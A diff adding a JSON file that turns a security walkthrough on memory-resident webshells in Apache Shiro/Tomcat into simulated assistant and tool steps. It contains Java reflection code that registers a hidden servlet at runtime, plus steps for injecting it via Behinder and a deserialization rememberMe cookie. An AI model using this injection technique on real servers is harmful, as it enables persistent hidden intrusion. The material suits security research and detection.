@@ -1,0 +1,80 @@
+{
+    "_source_md":  "Deser-Walkthrough/2021-03-10-Research-on-Webshell-Attack-of-Shiro-Framework-Based-on-Memory.md",
+    "version":  "shiro-memory-webshell",
+    "title":  {
+                  "zh":  "基于内存的Shiro框架Webshell攻击研究",
+                  "en":  "Memory-Based Webshell Attack Research on Shiro Framework"
+              },
+    "description":  {
+                        "zh":  "研究Shiro框架基于内存的Webshell攻击，包括Tomcat冰蝎内存马注入原理与实现。",
+                        "en":  "Research on memory-based Webshell attack for Shiro framework, including Tomcat Behinder memory shell injection principle and implementation."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "研究Shiro内存Webshell攻击",
+                                      "en":  "Research Shiro memory Webshell attack"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "  public void dynamicAddServlet(ServletContext servletContext) throws Exception {\n    Method method;\n    String wrapperName = this.path;\n    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade)servletContext;\n    Field applicationContextField = applicationContextFacade.getClass().getDeclaredField(\"context\");\n    applicationContextField.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext)applicationContextField.get(applicationContextFacade);\n    Field standardContextField = applicationContext.getClass().getDeclaredField(\"context\");\n    standardContextField.setAccessible(true);\n    StandardContext standardContext = (StandardContext)standardContextField.get(applicationContext);\n    Object newWrapper = invoke(standardContext, \"createWrapper\", (Object[])null);\n    invoke(newWrapper, \"setName\", new Object[] { wrapperName });\n    setFieldValue(newWrapper, \"instance\", this);\n    Class\u003c?\u003e containerClass = Class.forName(\"org.apache.catalina.Container\", false, standardContext.getClass().getClassLoader());\n    Object oldWrapper = invoke(standardContext, \"findChild\", new Object[] { wrapperName });\n    if (oldWrapper != null)\n      standardContext.getClass().getDeclaredMethod(\"removeChild\", new Class[] { containerClass }); \n    standardContext.getClass().getDeclaredMethod(\"addChild\", new Class[] { containerClass }).invoke(standardContext, new Object[] { newWrapper });\n    try {\n      method = standardContext.getClass().getMethod(\"addServletMappingDecoded\", new Class[] { String.class, String.class });\n    } catch (Exception var9) {\n      method = standardContext.getClass().getMethod(\"addServletMapping\", new Class[] { String.class, String.class });\n    } \n    method.invoke(standardContext, new Object[] { this.path, wrapperName });\n    init((ServletConfig)getFieldValue(newWrapper, \"facade\"));\n  }",
+                                             "language":  "java"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "部署方式：IDEA tomcat调试部署、docker-compose部署、Docker+IDEA组合",
+                                      "en":  "Deployment methods: IDEA tomcat debug deployment, docker-compose deployment, Docker+IDEA combination"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "exec",
+                      "content":  {
+                                      "zh":  "IDEA调试配置：在catalina.sh中添加CATALINA_OPTS开放5555调试端口",
+                                      "en":  "IDEA debug config: Add CATALINA_OPTS in catalina.sh to open 5555 debug port"
+                                  },
+                      "annotation":  {
+                                         "zh":  "工具执行结果",
+                                         "en":  "工具执行结果"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "内存马注入：使用冰蝎2_Tomcat工具，POST发送p、path、dy参数，通过rememberMe Cookie触发反序列化注入",
+                                      "en":  "Memory shell injection: Use Behinder 2_Tomcat tool, POST p, path, dy parameters, trigger deserialization via rememberMe Cookie"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "注入原理：通过反射获取StandardContext，动态创建Servlet Wrapper并添加到容器中",
+                                      "en":  "Injection principle: Get StandardContext via reflection, dynamically create Servlet Wrapper and add to container"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  }
+              ]
+}
